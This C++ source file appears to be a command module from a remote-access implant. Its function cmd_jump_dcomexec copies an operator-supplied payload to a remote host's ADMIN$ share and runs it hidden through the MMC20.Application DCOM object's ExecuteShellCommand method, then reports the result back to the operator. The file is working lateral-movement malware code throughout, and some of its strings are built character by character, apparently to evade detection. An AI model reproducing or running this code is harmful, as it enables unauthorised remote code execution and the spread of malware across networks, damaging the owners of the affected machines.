#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_JUMP_DCOMEXEC

using namespace stardust;
using namespace starburst;

static const GUID CLSID_MMC20 = { 0x49B2791A, 0xB1AE, 0x4C90, { 0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89 } };
static const GUID LOCAL_IID_IDispatch = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
static const GUID LOCAL_IID_NULL = { 0x00000000, 0x0000, 0x0000, { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };

typedef HRESULT (WINAPI *fnCoInitializeEx)( LPVOID, DWORD );
typedef void    (WINAPI *fnCoUninitialize)( void );
typedef HRESULT (WINAPI *fnCoCreateInstanceEx)( REFCLSID, IUnknown*, DWORD, COSERVERINFO*, DWORD, MULTI_QI* );
typedef HRESULT (WINAPI *fnCoInitializeSecurity)( PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void* );

typedef BSTR (WINAPI *fnSysAllocString)( const OLECHAR* );
typedef void (WINAPI *fnSysFreeString)( BSTR );

struct IDispatchVtbl_s {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)( void*, REFIID, void** );
    ULONG   (STDMETHODCALLTYPE *AddRef)( void* );
    ULONG   (STDMETHODCALLTYPE *Release)( void* );
    void*   GetTypeInfoCount;
    void*   GetTypeInfo;
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)( void*, REFIID, LPOLESTR*, UINT, LCID, DISPID* );
    HRESULT (STDMETHODCALLTYPE *Invoke)( void*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT* );
};
struct IDispatch_s { IDispatchVtbl_s* lpVtbl; };

auto declfn starburst::cmd_jump_dcomexec(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );
    if ( !host_str || host_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no hostname provided" ) ) );
        return;
    }

    uint32_t filename_len = 0;
    auto filename_str = parser_string( params, &filename_len );
    if ( !filename_str || filename_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no filename provided" ) ) );
        return;
    }

    uint32_t payload_len = 0;
    auto payload_data = reinterpret_cast<uint8_t*>( parser_bytes( params, &payload_len ) );
    if ( !payload_data || payload_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no payload data provided" ) ) );
        return;
    }

    // build UNC path: \\host\ADMIN$\Temp\filename
    char unc_path[512] = { '\\', '\\', 0 };
    int uidx = 2;
    for ( uint32_t i = 0; i < host_len && uidx < 480; i++ )
        unc_path[uidx++] = host_str[i];
    char admin_suffix[] = { '\\','A','D','M','I','N','$','\\','T','e','m','p','\\', 0 };
    for ( int i = 0; admin_suffix[i] && uidx < 500; i++ )
        unc_path[uidx++] = admin_suffix[i];
    for ( uint32_t i = 0; i < filename_len && uidx < 510; i++ )
        unc_path[uidx++] = filename_str[i];
    unc_path[uidx] = 0;

    // wide UNC for cleanup
    wchar_t w_unc[512] = {};
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, unc_path, uidx, w_unc, 511 );

    // build exec path: C:\Windows\Temp\filename
    char exec_path[512] = { 'C',':','\\','W','i','n','d','o','w','s','\\','T','e','m','p','\\', 0 };
    int eidx = 16;
    for ( uint32_t i = 0; i < filename_len && eidx < 510; i++ )
        exec_path[eidx++] = filename_str[i];
    exec_path[eidx] = 0;

    // stage payload to UNC path
    HANDLE h_file = inst.kernel32.CreateFileA(
        unc_path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr );
    if ( h_file == INVALID_HANDLE_VALUE ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to create file on remote host - check ADMIN$ access" ) ) );
        return;
    }

    DWORD written = 0;
    BOOL write_ok = inst.kernel32.WriteFile( h_file, payload_data, payload_len, &written, nullptr );
    inst.kernel32.CloseHandle( h_file );

    if ( !write_ok || written != payload_len ) {
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to write payload to remote host" ) ) );
        return;
    }

    // resolve COM APIs
    HMODULE h_ole32 = inst.kernel32.LoadLibraryA(
        symbol<char*>( const_cast<char*>( "ole32.dll" ) ) );
    HMODULE h_oleaut32 = inst.kernel32.LoadLibraryA(
        symbol<char*>( const_cast<char*>( "oleaut32.dll" ) ) );

    if ( !h_ole32 || !h_oleaut32 ) {
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load COM libraries" ) ) );
        return;
    }

    auto pCoInitializeEx = reinterpret_cast<fnCoInitializeEx>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoInitializeEx" ) ) ) );
    auto pCoUninitialize = reinterpret_cast<fnCoUninitialize>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoUninitialize" ) ) ) );
    auto pCoCreateInstanceEx = reinterpret_cast<fnCoCreateInstanceEx>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoCreateInstanceEx" ) ) ) );
    auto pCoInitializeSecurity = reinterpret_cast<fnCoInitializeSecurity>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoInitializeSecurity" ) ) ) );
    auto pSysAllocString = reinterpret_cast<fnSysAllocString>(
        inst.kernel32.GetProcAddress( h_oleaut32,
            symbol<char*>( const_cast<char*>( "SysAllocString" ) ) ) );
    auto pSysFreeString = reinterpret_cast<fnSysFreeString>(
        inst.kernel32.GetProcAddress( h_oleaut32,
            symbol<char*>( const_cast<char*>( "SysFreeString" ) ) ) );

    if ( !pCoInitializeEx || !pCoCreateInstanceEx || !pSysAllocString || !pSysFreeString ) {
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve COM APIs" ) ) );
        return;
    }

    HRESULT hr = pCoInitializeEx( nullptr, 0 );

    if ( pCoInitializeSecurity ) {
        pCoInitializeSecurity( nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
    }

    wchar_t w_host[256] = {};
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_str, host_len, w_host, 255 );

    COSERVERINFO si = {};
    si.pwszName = w_host;

    MULTI_QI mqi = {};
    mqi.pIID = &LOCAL_IID_IDispatch;

    hr = pCoCreateInstanceEx( CLSID_MMC20, nullptr, 0x14, &si, 1, &mqi );
    if ( FAILED( hr ) || FAILED( mqi.hr ) || !mqi.pItf ) {
        pCoUninitialize();
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CoCreateInstanceEx MMC20 failed - check DCOM perms" ) ) );
        return;
    }

    auto pApp = reinterpret_cast<IDispatch_s*>( mqi.pItf );

    wchar_t doc_name[] = { 'D','o','c','u','m','e','n','t', 0 };
    LPOLESTR doc_names[] = { doc_name };
    DISPID doc_dispid;
    hr = pApp->lpVtbl->GetIDsOfNames( pApp, LOCAL_IID_NULL, doc_names, 1, LOCALE_SYSTEM_DEFAULT, &doc_dispid );
    if ( FAILED( hr ) ) {
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetIDsOfNames Document failed" ) ) );
        return;
    }

    DISPPARAMS dp_empty = { nullptr, nullptr, 0, 0 };
    VARIANT vt_doc;
    vt_doc.vt = VT_EMPTY;
    hr = pApp->lpVtbl->Invoke( pApp, doc_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_PROPERTYGET, &dp_empty, &vt_doc, nullptr, nullptr );
    if ( FAILED( hr ) || vt_doc.vt != VT_DISPATCH || !vt_doc.pdispVal ) {
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "Invoke Document failed" ) ) );
        return;
    }

    auto pDoc = reinterpret_cast<IDispatch_s*>( vt_doc.pdispVal );

    wchar_t av_name[] = { 'A','c','t','i','v','e','V','i','e','w', 0 };
    LPOLESTR av_names[] = { av_name };
    DISPID av_dispid;
    hr = pDoc->lpVtbl->GetIDsOfNames( pDoc, LOCAL_IID_NULL, av_names, 1, LOCALE_SYSTEM_DEFAULT, &av_dispid );
    if ( FAILED( hr ) ) {
        pDoc->lpVtbl->Release( pDoc );
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetIDsOfNames ActiveView failed" ) ) );
        return;
    }

    VARIANT vt_view;
    vt_view.vt = VT_EMPTY;
    hr = pDoc->lpVtbl->Invoke( pDoc, av_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_PROPERTYGET, &dp_empty, &vt_view, nullptr, nullptr );
    if ( FAILED( hr ) || vt_view.vt != VT_DISPATCH || !vt_view.pdispVal ) {
        pDoc->lpVtbl->Release( pDoc );
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "Invoke ActiveView failed" ) ) );
        return;
    }

    auto pView = reinterpret_cast<IDispatch_s*>( vt_view.pdispVal );

    wchar_t esc_name[] = { 'E','x','e','c','u','t','e','S','h','e','l','l','C','o','m','m','a','n','d', 0 };
    LPOLESTR esc_names[] = { esc_name };
    DISPID esc_dispid;
    hr = pView->lpVtbl->GetIDsOfNames( pView, LOCAL_IID_NULL, esc_names, 1, LOCALE_SYSTEM_DEFAULT, &esc_dispid );
    if ( FAILED( hr ) ) {
        pView->lpVtbl->Release( pView );
        pDoc->lpVtbl->Release( pDoc );
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetIDsOfNames ExecuteShellCommand failed" ) ) );
        return;
    }

    // ExecuteShellCommand(Command, Directory, Parameters, WindowState)
    // execute the staged payload path directly
    wchar_t w_exec[512] = {};
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, exec_path, eidx, w_exec, 511 );

    wchar_t w_empty[] = { 0 };
    wchar_t w_hidden[] = { '7', 0 };

    VARIANT args[4];
    args[3].vt = VT_BSTR; args[3].bstrVal = pSysAllocString( w_exec );     // Command
    args[2].vt = VT_BSTR; args[2].bstrVal = pSysAllocString( w_empty );    // Directory
    args[1].vt = VT_BSTR; args[1].bstrVal = pSysAllocString( w_empty );    // Parameters
    args[0].vt = VT_BSTR; args[0].bstrVal = pSysAllocString( w_hidden );   // WindowState = hidden

    DISPPARAMS dp = { args, nullptr, 4, 0 };
    VARIANT vt_result;
    vt_result.vt = VT_EMPTY;

    hr = pView->lpVtbl->Invoke( pView, esc_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_METHOD, &dp, &vt_result, nullptr, nullptr );

    for ( int i = 0; i < 4; i++ ) pSysFreeString( args[i].bstrVal );

    pView->lpVtbl->Release( pView );
    pDoc->lpVtbl->Release( pDoc );
    pApp->lpVtbl->Release( pApp );
    pCoUninitialize();

    if ( SUCCEEDED( hr ) ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "payload staged and executed via DCOM MMC20" ) ) );
    } else {
        inst.kernel32.DeleteFileW( w_unc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "payload staged but DCOM ExecuteShellCommand failed" ) ) );
    }
}

#endif
